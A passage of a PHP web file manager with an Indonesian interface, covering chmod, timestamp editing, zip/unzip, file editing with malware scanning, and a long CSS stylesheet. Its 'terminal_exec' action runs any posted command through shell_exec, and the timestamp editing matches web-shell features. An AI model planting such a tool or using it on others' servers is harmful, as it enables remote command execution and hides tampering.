                $msg = "Izin untuk '" . htmlspecialchars($item_to_chmod) . "' berhasil diubah menjadi " . htmlspecialchars($permissions) . "."; $type = "success"; 
                log_action("Permissions Changed", "Item: ".htmlspecialchars($item_to_chmod).", Perms: ".$permissions.", Path: ".htmlspecialchars($relative_current_path), "SUCCESS");
            } else { 
                $msg = "Gagal mengubah izin untuk '" . htmlspecialchars($item_to_chmod) . "'."; $type = "danger"; 
                log_action("Chmod Failed", "Item: ".htmlspecialchars($item_to_chmod).", Perms: ".$permissions.", Path: ".htmlspecialchars($relative_current_path), "ERROR");
            }
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'edit_time' && isset($_POST['item']) && isset($_POST['datetime'])) {
        $item_to_touch = sanitize_path(basename($_POST['item'])); $datetime_str = $_POST['datetime'];
        $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_to_touch; $timestamp = strtotime($datetime_str);
        if (!file_exists($item_full_path)) { $msg = "Item '" . htmlspecialchars($item_to_touch) . "' tidak ditemukan."; $type = "danger"; log_action("Edit Time Failed", "Item: ".htmlspecialchars($item_to_touch)." (not found)", "WARNING");}
        elseif ($timestamp === false) { $msg = "Format tanggal/waktu tidak valid: " . htmlspecialchars($datetime_str); $type = "danger"; log_action("Edit Time Failed", "Item: ".htmlspecialchars($item_to_touch).", Invalid datetime: ".$datetime_str, "WARNING");}
        elseif (touch($item_full_path, $timestamp)) { 
            $msg = "Waktu modifikasi untuk '" . htmlspecialchars($item_to_touch) . "' berhasil diubah."; $type = "success"; 
            log_action("Timestamp Changed", "Item: ".htmlspecialchars($item_to_touch).", Time: ".$datetime_str.", Path: ".htmlspecialchars($relative_current_path), "SUCCESS");
        } else { 
            $msg = "Gagal mengubah waktu modifikasi untuk '" . htmlspecialchars($item_to_touch) . "'."; $type = "danger"; 
            log_action("Edit Time Failed", "Item: ".htmlspecialchars($item_to_touch).", Time: ".$datetime_str.", Path: ".htmlspecialchars($relative_current_path), "ERROR");
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'zip' && isset($_POST['items_to_zip']) && is_array($_POST['items_to_zip'])) {
        if (!class_exists('ZipArchive')) { $msg = "Kelas ZipArchive tidak ditemukan. Fitur Zip tidak tersedia."; $type = "danger"; log_action("Zip Failed", "ZipArchive class not found", "ERROR");}
        else {
            $items_to_zip_arr = $_POST['items_to_zip']; $zip_name = 'arsip_' . date('YmdHis') . '.zip';
            $zip_path = $current_path . DIRECTORY_SEPARATOR . $zip_name; $zip = new ZipArchive();
            if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $zipped_count = 0; $zipped_items_log = [];
                foreach ($items_to_zip_arr as $item_name) {
                    $item_name_sanitized = sanitize_path(basename($item_name));
                    $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_name_sanitized;
                    if (file_exists($item_full_path)) {
                        if (is_dir($item_full_path)) {
                            $files_in_dir = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($item_full_path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
                            foreach ($files_in_dir as $name_in_dir => $file_in_dir) {
                                if (!$file_in_dir->isDir()) {
                                    $filePath = $file_in_dir->getRealPath();
                                    $relativePath = $item_name_sanitized . DIRECTORY_SEPARATOR . substr($filePath, strlen($item_full_path) + 1);
                                    $zip->addFile($filePath, $relativePath);
                                }
                            } $zip->addEmptyDir($item_name_sanitized); 
                        } else { $zip->addFile($item_full_path, $item_name_sanitized); }
                        $zipped_count++; $zipped_items_log[] = $item_name_sanitized;
                    }
                } $zip->close();
                if ($zipped_count > 0) { 
                    $msg = $zipped_count . " item berhasil di-zip ke '" . htmlspecialchars($zip_name) . "'."; $type = "success"; 
                    log_action("Files Zipped", "Archive: ".htmlspecialchars($zip_name).", Items: ".implode(', ',$zipped_items_log).", Path: ".htmlspecialchars($relative_current_path), "SUCCESS");
                } else { 
                    $msg = "Tidak ada item valid yang dipilih untuk di-zip."; $type = "warning"; if(file_exists($zip_path)) unlink($zip_path); 
                    log_action("Zip Attempt Failed", "No valid items selected", "WARNING");
                }
            } else { $msg = "Gagal membuat file zip."; $type = "danger"; log_action("Zip Failed", "Could not create zip archive", "ERROR");}
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'unzip' && isset($_GET['item'])) {
        if (!class_exists('ZipArchive')) { $msg = "Kelas ZipArchive tidak ditemukan. Fitur Unzip tidak tersedia."; $type = "danger"; log_action("Unzip Failed", "ZipArchive class not found", "ERROR");}
        else {
            $zip_file_name = sanitize_path(basename($_GET['item']));
            $zip_file_path = $current_path . DIRECTORY_SEPARATOR . $zip_file_name;
            if (!file_exists($zip_file_path) || strtolower(pathinfo($zip_file_name, PATHINFO_EXTENSION)) !== 'zip') { 
                $msg = "File zip '" . htmlspecialchars($zip_file_name) . "' tidak ditemukan atau bukan file zip."; $type = "danger"; 
                log_action("Unzip Failed", "File not found or not a zip: ".htmlspecialchars($zip_file_name), "WARNING");
            } else {
                $zip = new ZipArchive();
                if ($zip->open($zip_file_path) === TRUE) {
                    if ($zip->extractTo($current_path)) { 
                        $msg = "File '" . htmlspecialchars($zip_file_name) . "' berhasil di-unzip."; $type = "success"; 
                        log_action("File Unzipped", "Archive: ".htmlspecialchars($zip_file_name).", Path: ".htmlspecialchars($relative_current_path), "SUCCESS");
                    } else { 
                        $msg = "Gagal mengekstrak file '" . htmlspecialchars($zip_file_name) . "'. Periksa izin tulis."; $type = "danger"; 
                        log_action("Unzip Failed", "Could not extract: ".htmlspecialchars($zip_file_name), "ERROR");
                    }
                    $zip->close();
                } else { 
                    $msg = "Gagal membuka file zip '" . htmlspecialchars($zip_file_name) . "'."; $type = "danger"; 
                    log_action("Unzip Failed", "Could not open zip: ".htmlspecialchars($zip_file_name), "ERROR");
                }
            }
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'preview' && isset($_GET['item'])) {
        $item_to_preview = sanitize_path(basename($_GET['item']));
        $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_to_preview;
        if (file_exists($item_full_path) && is_readable($item_full_path) && !is_dir($item_full_path)) {
            log_action("File Preview/Download", "Item: ".htmlspecialchars($item_to_preview).", Path: ".htmlspecialchars($relative_current_path), "INFO");
            $mime_type = mime_content_type($item_full_path);
            if (strpos($mime_type, 'text/') === 0 || in_array($mime_type, ['application/json', 'application/xml', 'application/javascript', 'application/css'])) {
                header('Content-Type: ' . $mime_type . '; charset=utf-8'); readfile($item_full_path); exit;
            } elseif (strpos($mime_type, 'image/') === 0 || $mime_type === 'application/pdf') { 
                header('Content-Type: ' . $mime_type); header('Content-Length: ' . filesize($item_full_path)); readfile($item_full_path); exit;
            } else { 
                header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($item_full_path) . '"');
                header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public');
                header('Content-Length: ' . filesize($item_full_path)); readfile($item_full_path); exit;
            }
        }
        $msg = "Gagal mempreview file '" . htmlspecialchars($item_to_preview) . "'. File tidak ada atau tidak bisa dibaca."; $type = "danger";
        log_action("Preview Failed", "Item: ".htmlspecialchars($item_to_preview)." (not found/unreadable)", "WARNING");
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'edit' && isset($_GET['item'])) { 
        log_action("File Edit Page Accessed", "Item: ".htmlspecialchars(basename($_GET['item'])).", Path: ".htmlspecialchars($relative_current_path), "INFO");
        /* Halaman edit ditangani di HTML */ 
    } elseif ($aksi === 'save_edit' && isset($_POST['item']) && isset($_POST['content'])) {
        $item_to_save = sanitize_path(basename($_POST['item'])); $content_to_save = $_POST['content']; 
        $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_to_save;
        $malware_detected_msg = "";
        if (!is_file_editable($item_full_path)) { $msg = "Tipe file '" . htmlspecialchars($item_to_save) . "' tidak diizinkan untuk diedit."; $type = "danger"; log_action("Save Edit Failed", "Item: ".htmlspecialchars($item_to_save)." (not editable type)", "WARNING");}
        elseif (!is_writable($item_full_path)) { $msg = "File '" . htmlspecialchars($item_to_save) . "' tidak dapat ditulis. Periksa izin."; $type = "danger"; log_action("Save Edit Failed", "Item: ".htmlspecialchars($item_to_save)." (not writable)", "ERROR");}
        elseif (file_put_contents($item_full_path, $content_to_save) !== false) {
            $msg = "File '" . htmlspecialchars($item_to_save) . "' berhasil disimpan."; $type = "success";
            log_action("File Edited & Saved", "Item: ".htmlspecialchars($item_to_save).", Path: ".htmlspecialchars($relative_current_path), "SUCCESS");
            if (scan_for_malicious_patterns($item_full_path)) {
                $malware_detected_msg = " PERINGATAN: Potensi kode berbahaya terdeteksi setelah menyimpan file ini!";
                $type = "warning"; 
                log_action("Malware Detected After Edit", "Item: ".htmlspecialchars($item_to_save).", Path: ".htmlspecialchars($relative_current_path), "CRITICAL");
            } $msg .= $malware_detected_msg;
        } else { $msg = "Gagal menyimpan file '" . htmlspecialchars($item_to_save) . "'."; $type = "danger"; log_action("Save Edit Failed", "Item: ".htmlspecialchars($item_to_save)." (file_put_contents failed)", "ERROR");}
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&item=" . urlencode($item_to_save) . "&aksi=edit&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'terminal_exec' && $config['fitur_berbahaya']['terminal'] && isset($_POST['command'])) {
        $command = $_POST['command']; $output = '';
        log_action("Terminal Command Executed", "Command: ".$command.", Path: ".htmlspecialchars($relative_current_path), "WARNING");
        if (function_exists('shell_exec')) { $output = shell_exec($command . ' 2>&1'); } 
        else { $output = "Fungsi shell_exec tidak tersedia."; }
        $_SESSION['terminal_output'] = $output; $_SESSION['last_command'] = $command;
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&show_terminal=true"); exit;
    } elseif ($aksi === 'scan_directory') {
        $scanned_files_count = 0; $threats_found_count = 0; $threat_details = [];
        $dir_items = scandir($current_path);
        if ($dir_items === false) {
            $msg = "Gagal membaca isi direktori."; $type = "danger";
            log_action("Directory Scan Failed", "Could not read directory: ".htmlspecialchars($relative_current_path), "ERROR");
        } else {
            foreach ($dir_items as $item) {
                if (in_array($item, $config['sembunyikan_item'])) continue;
                $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item;
                if (is_file($item_full_path)) {
                    $scanned_files_count++;
                    if (scan_for_malicious_patterns($item_full_path)) {
                        $threats_found_count++;
                        $threat_details[] = htmlspecialchars($item);
                    }
                }
            }
            if ($threats_found_count > 0) {
                $msg = "Pemindaian direktori selesai. " . $threats_found_count . " potensi ancaman ditemukan di " . $scanned_files_count . " file yang dipindai: " . implode(', ', $threat_details) . ". Harap periksa secara manual!";
                $type = "warning";
                log_action("Directory Scan Result", "Path: ".htmlspecialchars($relative_current_path).", Threats: ".$threats_found_count."/".$scanned_files_count.", Files: ".implode(', ',$threat_details), "WARNING");
            } else {
                $msg = "Pemindaian direktori selesai. Tidak ada potensi ancaman terdeteksi di " . $scanned_files_count . " file yang dipindai.";
                $type = "success";
                log_action("Directory Scan Result", "Path: ".htmlspecialchars($relative_current_path).", Threats: 0/".$scanned_files_count, "INFO");
            }
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php if ($aksi === 'edit' && isset($_GET['item'])) { echo "Edit: " . htmlspecialchars(basename($_GET['item'])) . " - " . htmlspecialchars($config['judul_filemanager']); } else { echo htmlspecialchars($config['judul_filemanager']) . " - " . htmlspecialchars(basename($current_path)); } ?></title>
    <style>
        :root { 
            --font-family-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            --font-family-mono: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
            --color-bg-light: #f9fafb; --color-text-light: #1f2937; --color-primary-light: #3b82f6;
            --color-primary-hover-light: #2563eb; --color-secondary-light: #6b7280; --color-border-light: #e5e7eb;
            --color-card-bg-light: #ffffff; --color-table-header-bg-light: #f3f4f6; --color-table-row-hover-bg-light: #f0f2f5;
            --color-success-light: #10b981; --color-danger-light: #ef4444; --color-warning-light: #f59e0b; --color-info-light: #3b82f6;
            --color-link-light: var(--color-primary-light);
            --color-danger-light-rgb: 239, 68, 68; 

            --color-bg-dark: #111827; --color-text-dark: #d1d5db; --color-primary-dark: #60a5fa;
            --color-primary-hover-dark: #3b82f6; --color-secondary-dark: #9ca3af; --color-border-dark: #374151;
            --color-card-bg-dark: #1f2937; --color-table-header-bg-dark: #374151; --color-table-row-hover-bg-dark: #2c3542;
            --color-success-dark: #34d399; --color-danger-dark: #f87171; --color-warning-dark: #fbbf24; --color-info-dark: var(--color-primary-dark);
            --color-link-dark: var(--color-primary-dark);
            --color-danger-dark-rgb: 248, 113, 113; 

            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05); --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --border-radius: 0.5rem; --border-radius-sm: 0.25rem;
        }
        body { font-family: var(--font-family-sans); margin: 0; background-color: var(--color-bg-light); color: var(--color-text-light); font-size: 14px; line-height: 1.6; display: flex; flex-direction: column; min-height: 100vh; transition: background-color 0.3s ease, color 0.3s ease; }
        body.dark-mode { background-color: var(--color-bg-dark); color: var(--color-text-dark); }
        .main-wrapper { display: flex; flex-direction: column; flex-grow: 1; }
        .container { width: 95%; max-width: 1400px; margin: 20px auto; padding: 20px; background-color: var(--color-card-bg-light); border-radius: var(--border-radius); box-shadow: var(--shadow-md); flex-grow: 1; }
        body.dark-mode .container { background-color: var(--color-card-bg-dark); }
        .navbar { background-color: var(--color-card-bg-light); color: var(--color-text-light); padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--color-border-light); box-shadow: var(--shadow-sm); position: sticky; top: 0; z-index: 1000; }
        body.dark-mode .navbar { background-color: var(--color-card-bg-dark); color: var(--color-text-dark); border-bottom-color: var(--color-border-dark); }
        .navbar .title { font-size: 1.5em; font-weight: 600; }
        .navbar .nav-buttons .btn { margin-left: 0.75rem; }
        .breadcrumb { padding: 0.75rem 0; margin-bottom: 1.25rem; list-style: none; background-color: transparent; font-size: 0.9em; display: flex; flex-wrap: wrap; align-items: center; }
        .breadcrumb-item { display: flex; align-items: center; }
        .breadcrumb-item+.breadcrumb-item::before { content: "›"; margin: 0 0.5rem; color: var(--color-secondary-light); }
        body.dark-mode .breadcrumb-item+.breadcrumb-item::before { color: var(--color-secondary-dark); }
        .breadcrumb-item a { color: var(--color-link-light); text-decoration: none; font-weight: 500; }
        body.dark-mode .breadcrumb-item a { color: var(--color-link-dark); }
        .breadcrumb-item a:hover { text-decoration: underline; }
        .breadcrumb-item.active { color: var(--color-secondary-light); font-weight: 500; }
        body.dark-mode .breadcrumb-item.active { color: var(--color-secondary-dark); }
        .current-path-info { font-size: 0.85em; color: var(--color-secondary-light); margin-bottom: 1.25rem; word-break: break-all; }
        body.dark-mode .current-path-info { color: var(--color-secondary-dark); }
        .toolbar { display: flex; flex-wrap: wrap; gap: 0.75rem; margin-bottom: 1.25rem; align-items: center; }
        .search-bar { display: flex; flex-grow: 1; min-width: 250px; }
        .search-bar input[type="text"] { flex-grow: 1; padding: 0.6rem 0.8rem; border: 1px solid var(--color-border-light); border-radius: var(--border-radius-sm) 0 0 var(--border-radius-sm); font-size: 0.9em; background-color: var(--color-card-bg-light); color: var(--color-text-light); }
        body.dark-mode .search-bar input[type="text"] { background-color: var(--color-card-bg-dark); border-color: var(--color-border-dark); color: var(--color-text-dark); }
        .search-bar input[type="text"]:focus { outline: none; border-color: var(--color-primary-light); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3); }
        body.dark-mode .search-bar input[type="text"]:focus { border-color: var(--color-primary-dark); box-shadow: 0 0 0 2px rgba(96, 165, 250, 0.3); }
        .search-bar .btn { border-radius: 0 var(--border-radius-sm) var(--border-radius-sm) 0; }
        .actions-bar { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1rem; }
        .file-table { width: 100%; border-collapse: separate; border-spacing: 0; margin-top: 1.25rem; font-size: 0.9em; }
        .file-table th, .file-table td { padding: 0.75rem 1rem; text-align: left; vertical-align: middle; border-bottom: 1px solid var(--color-border-light); }
        body.dark-mode .file-table th, body.dark-mode .file-table td { border-bottom-color: var(--color-border-dark); }
        .file-table th { background-color: var(--color-table-header-bg-light); font-weight: 600; color: var(--color-text-light); }
        body.dark-mode .file-table th { background-color: var(--color-table-header-bg-dark); color: var(--color-text-dark); }
        .file-table tr:hover td { background-color: var(--color-table-row-hover-bg-light); }
        body.dark-mode .file-table tr:hover td { background-color: var(--color-table-row-hover-bg-dark); }
        .file-table tr.table-danger-row td { background-color: rgba(var(--color-danger-light-rgb), 0.15) !important; }
        body.dark-mode .file-table tr.table-danger-row td { background-color: rgba(var(--color-danger-dark-rgb), 0.2) !important; }
        .file-table tr.table-danger-row:hover td { background-color: rgba(var(--color-danger-light-rgb), 0.25) !important; }
        body.dark-mode .file-table tr.table-danger-row:hover td { background-color: rgba(var(--color-danger-dark-rgb), 0.3) !important; }
        .file-table td a { color: var(--color-link-light); text-decoration: none; font-weight: 500; }
        body.dark-mode .file-table td a { color: var(--color-link-dark); }
        .file-table td a:hover { text-decoration: underline; }
        .file-table .actions .btn { margin-right: 0.3rem; margin-bottom: 0.3rem; padding: 0.3rem 0.6rem; font-size: 0.85em; }
        .file-table .icon { font-size: 1.2em; margin-right: 0.5rem; vertical-align: middle; }
        .file-table input[type="checkbox"] { width: 1rem; height: 1rem; vertical-align: middle; }
        .malware-warning-icon { color: var(--color-danger-light); font-weight: bold; margin-left: 0.3rem; cursor: help; }
        body.dark-mode .malware-warning-icon { color: var(--color-danger-dark); }
        #drop-area { border: 2px dashed var(--color-border-light); border-radius: var(--border-radius); padding: 2rem; text-align: center; margin-bottom: 1.25rem; background-color: var(--color-bg-light); cursor: pointer; transition: border-color 0.2s ease, background-color 0.2s ease; }
        body.dark-mode #drop-area { border-color: var(--color-border-dark); background-color: var(--color-card-bg-dark); }
        #drop-area.highlight { border-color: var(--color-primary-light); background-color: rgba(59, 130, 246, 0.05); }
        body.dark-mode #drop-area.highlight { border-color: var(--color-primary-dark); background-color: rgba(96, 165, 250, 0.1); }
        #drop-area p { margin: 0; font-size: 1em; color: var(--color-secondary-light); }
        body.dark-mode #drop-area p { color: var(--color-secondary-dark); }
        #upload-progress { width:100%; margin-top: 0.5rem; height: 0.5rem; border-radius: var(--border-radius-sm); }
        #upload-progress::-webkit-progress-bar { background-color: var(--color-border-light); border-radius: var(--border-radius-sm); }
        #upload-progress::-webkit-progress-value { background-color: var(--color-primary-light); border-radius: var(--border-radius-sm); transition: width 0.1s ease; }
        body.dark-mode #upload-progress::-webkit-progress-bar { background-color: var(--color-border-dark); }
        body.dark-mode #upload-progress::-webkit-progress-value { background-color: var(--color-primary-dark); }
        .footer { text-align: center; padding: 1.5rem; margin-top: auto; background-color: var(--color-card-bg-light); color: var(--color-secondary-light); font-size: 0.9em; border-top: 1px solid var(--color-border-light); }
        body.dark-mode .footer { background-color: var(--color-card-bg-dark); color: var(--color-secondary-dark); border-top-color: var(--color-border-dark); }
        .modal { display: none; position: fixed; z-index: 1050; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); align-items: center; justify-content: center; }
        .modal-content { background-color: var(--color-card-bg-light); margin: auto; padding: 1.5rem; border: 1px solid var(--color-border-light); width: 90%; max-width: 600px; border-radius: var(--border-radius); box-shadow: var(--shadow-lg); position: relative; animation: modal-fade-in 0.3s ease-out; }
        body.dark-mode .modal-content { background-color: var(--color-card-bg-dark); border-color: var(--color-border-dark); }
        @keyframes modal-fade-in { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        .modal-header { padding-bottom: 0.75rem; border-bottom: 1px solid var(--color-border-light); margin-bottom: 1rem; }
        body.dark-mode .modal-header { border-bottom-color: var(--color-border-dark); }
        .modal-header h4 { margin: 0; font-size: 1.25em; font-weight: 600; }
        .modal-body { padding-top: 0.5rem; padding-bottom: 1rem; max-height: 70vh; overflow-y: auto;}
        .modal-body .logging-toggle-item { display: flex; justify-content: space-between; align-items: center; padding: 0.5rem 0; border-bottom: 1px solid var(--color-border-light); }
        body.dark-mode .modal-body .logging-toggle-item { border-bottom-color: var(--color-border-dark); }
        .modal-body .logging-toggle-item:last-child { border-bottom: none; }
        .modal-body hr { border: 0; border-top: 1px solid var(--color-border-light); margin: 1.5rem 0; }
        body.dark-mode .modal-body hr { border-top-color: var(--color-border-dark); }
        .modal-footer { padding-top: 1rem; border-top: 1px solid var(--color-border-light); text-align: right; display: flex; gap: 0.5rem; justify-content: flex-end; }
        body.dark-mode .modal-footer { border-top-color: var(--color-border-dark); }
        .close-btn { color: var(--color-secondary-light); font-size: 1.75rem; font-weight: bold; cursor: pointer; position: absolute; top: 0.75rem; right: 1rem; line-height: 1; }
        body.dark-mode .close-btn { color: var(--color-secondary-dark); }
        .close-btn:hover, .close-btn:focus { color: var(--color-text-light); text-decoration: none; }
        body.dark-mode .close-btn:hover, body.dark-mode .close-btn:focus { color: var(--color-text-dark); }
        .form-group { margin-bottom: 1rem; }
        .form-group label { display: block; margin-bottom: .5rem; font-weight: 500; font-size: 0.9em; }
        .form-group input[type="text"], .form-group input[type="password"], .form-group input[type="datetime-local"], .form-group input[type="url"], .form-group input[type="email"], .form-group textarea { width: 100%; box-sizing: border-box; padding: 0.6rem 0.8rem; font-size: 0.9em; color: var(--color-text-light); background-color: var(--color-card-bg-light); border: 1px solid var(--color-border-light); border-radius: var(--border-radius-sm); transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out; }
        body.dark-mode .form-group input[type="text"], body.dark-mode .form-group input[type="password"], body.dark-mode .form-group input[type="datetime-local"], body.dark-mode .form-group input[type="url"], body.dark-mode .form-group input[type="email"], body.dark-mode .form-group textarea { color: var(--color-text-dark); background-color: var(--color-bg-dark); border-color: var(--color-border-dark); }
        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: var(--color-primary-light); box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); }
        body.dark-mode .form-group input:focus, body.dark-mode .form-group textarea:focus { border-color: var(--color-primary-dark); box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.2); }
        .form-group textarea { min-height: 150px; font-family: var(--font-family-mono); }
        .btn { display: inline-flex; align-items: center; justify-content: center; font-weight: 500; text-align: center; vertical-align: middle; cursor: pointer; user-select: none; background-color: transparent; border: 1px solid transparent; padding: 0.6rem 1rem; font-size: 0.9em; line-height: 1.5; border-radius: var(--border-radius-sm); transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out, transform .1s ease-out; }
        .btn:disabled { opacity: 0.65; cursor: not-allowed; box-shadow: none; transform: none; }
        .btn .icon { margin-right: 0.4em; font-size: 1.1em; }
        .btn-primary { color: #fff; background-color: var(--color-primary-light); border-color: var(--color-primary-light); box-shadow: var(--shadow-sm); }
        .btn-primary:hover:not(:disabled) { background-color: var(--color-primary-hover-light); border-color: var(--color-primary-hover-light); box-shadow: var(--shadow-md); transform: translateY(-1px); }
        body.dark-mode .btn-primary { background-color: var(--color-primary-dark); border-color: var(--color-primary-dark); }
        body.dark-mode .btn-primary:hover:not(:disabled) { background-color: var(--color-primary-hover-dark); border-color: var(--color-primary-hover-dark); }
        .btn-secondary { color: var(--color-text-light); background-color: var(--color-table-header-bg-light); border-color: var(--color-border-light); box-shadow: var(--shadow-sm); }
        .btn-secondary:hover:not(:disabled) { background-color: var(--color-border-light); box-shadow: var(--shadow-md); transform: translateY(-1px); }
        body.dark-mode .btn-secondary { color: var(--color-text-dark); background-color: var(--color-border-dark); border-color: var(--color-border-dark); }
        body.dark-mode .btn-secondary:hover:not(:disabled) { background-color: var(--color-table-header-bg-dark); }
        .btn-danger { color: #fff; background-color: var(--color-danger-light); border-color: var(--color-danger-light); box-shadow: var(--shadow-sm); }
        .btn-danger:hover:not(:disabled) { background-color: #d93333; border-color: #d93333; box-shadow: var(--shadow-md); transform: translateY(-1px); }
        body.dark-mode .btn-danger { background-color: var(--color-danger-dark); border-color: var(--color-danger-dark); }
        body.dark-mode .btn-danger:hover:not(:disabled) { background-color: #f05050; border-color: #f05050; }
        .btn-warning { color: #fff; background-color: var(--color-warning-light); border-color: var(--color-warning-light); box-shadow: var(--shadow-sm); }
        .btn-warning:hover:not(:disabled) { background-color: #e08e0b; border-color: #e08e0b; box-shadow: var(--shadow-md); transform: translateY(-1px); }
        body.dark-mode .btn-warning { color: var(--color-bg-dark); background-color: var(--color-warning-dark); border-color: var(--color-warning-dark); }
        body.dark-mode .btn-warning:hover:not(:disabled) { background-color: #f0b01f; border-color: #f0b01f; }
        .btn-info { color: #fff; background-color: var(--color-info-light); border-color: var(--color-info-light); box-shadow: var(--shadow-sm); }
        .btn-info:hover:not(:disabled) { background-color: var(--color-primary-hover-light); border-color: var(--color-primary-hover-light); box-shadow: var(--shadow-md); transform: translateY(-1px); }
        body.dark-mode .btn-info { background-color: var(--color-info-dark); border-color: var(--color-info-dark); }
        body.dark-mode .btn-info:hover:not(:disabled) { background-color: var(--color-primary-hover-dark); border-color: var(--color-primary-hover-dark); }
        .btn-success { color: #fff; background-color: var(--color-success-light); border-color: var(--color-success-light); box-shadow: var(--shadow-sm); }
        .btn-success:hover:not(:disabled) { background-color: #0c9b6a; border-color: #0c9b6a; box-shadow: var(--shadow-md); transform: translateY(-1px); }
        body.dark-mode .btn-success { background-color: var(--color-success-dark); border-color: var(--color-success-dark); }
        body.dark-mode .btn-success:hover:not(:disabled) { background-color: #2cc289; border-color: #2cc289; }
        .btn-sm { padding: 0.3rem 0.6rem; font-size: 0.8em; }
        .alert { position: relative; padding: 0.8rem 1.25rem; margin-bottom: 1rem; border: 1px solid transparent; border-radius: var(--border-radius-sm); font-size: 0.9em; }
        .alert-success { color: var(--color-success-light); background-color: rgba(16, 185, 129, 0.1); border-color: rgba(16, 185, 129, 0.2); }
        body.dark-mode .alert-success { color: var(--color-success-dark); background-color: rgba(52, 211, 153, 0.15); border-color: rgba(52, 211, 153, 0.3); }
        .alert-danger { color: var(--color-danger-light); background-color: rgba(var(--color-danger-light-rgb), 0.1); border-color: rgba(var(--color-danger-light-rgb), 0.2); }
        body.dark-mode .alert-danger { color: var(--color-danger-dark); background-color: rgba(var(--color-danger-dark-rgb), 0.15); border-color: rgba(var(--color-danger-dark-rgb), 0.3); }
        .alert-warning { color: #856404; background-color: #fff3cd; border-color: #ffeeba; }
        body.dark-mode .alert-warning { color: var(--color-warning-dark); background-color: rgba(251, 191, 36, 0.15); border-color: rgba(251, 191, 36, 0.3); }
        .alert-info { color: #0c5460; background-color: #d1ecf1; border-color: #bee5eb; }
        body.dark-mode .alert-info { color: var(--color-info-dark); background-color: rgba(96, 165, 250, 0.15); border-color: rgba(96, 165, 250, 0.3); }
        .glitch-hover:hover { animation: glitch-subtle 0.2s infinite alternate; }
        @keyframes glitch-subtle { 0% { transform: translate(0, 0) skew(0); } 50% { transform: translate(0.5px, -0.5px) skew(0.2deg); } 100% { transform: translate(-0.5px, 0.5px) skew(-0.2deg); } }
        .login-page-wrapper { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 1rem; background-color: var(--color-bg-light); }
        body.dark-mode .login-page-wrapper { background-color: var(--color-bg-dark); }
        .login-box { width: 100%; max-width: 400px; padding: 2rem; background: var(--color-card-bg-light); border-radius: var(--border-radius); box-shadow: var(--shadow-lg); }
        body.dark-mode .login-box { background: var(--color-card-bg-dark); }
        .login-box h2 { text-align: center; margin-bottom: 1.5rem; font-size: 1.5em; font-weight: 600; color: var(--color-text-light); }
        body.dark-mode .login-box h2 { color: var(--color-text-dark); }
        .login-box .btn { width: 100%; padding: 0.75rem; font-size: 1em; }
        .edit-page-container { padding: 1rem 0; }
        .edit-page-container h3 { font-size: 1.5em; margin-bottom: 1rem; font-weight: 600; }
        .edit-page-container .form-group textarea { min-height: calc(100vh - 320px); max-height: 70vh; font-size: 0.9em; line-height: 1.6; }
        .edit-page-container .edit-actions-bar { margin-top: 1rem; display: flex; gap: 0.75rem; justify-content: flex-start; }
        #terminal-output { background: var(--color-bg-dark); color: #00ff00; padding: 0.75rem; height: 350px; overflow-y: scroll; font-family: var(--font-family-mono); white-space: pre-wrap; margin-bottom: 0.75rem; border-radius: var(--border-radius-sm); border: 1px solid var(--color-border-dark); font-size: 0.85em; }
        body.dark-mode #terminal-output { background: #0a0f14; border-color: #2a3038; }
        #terminal-form .input-group { display: flex; }
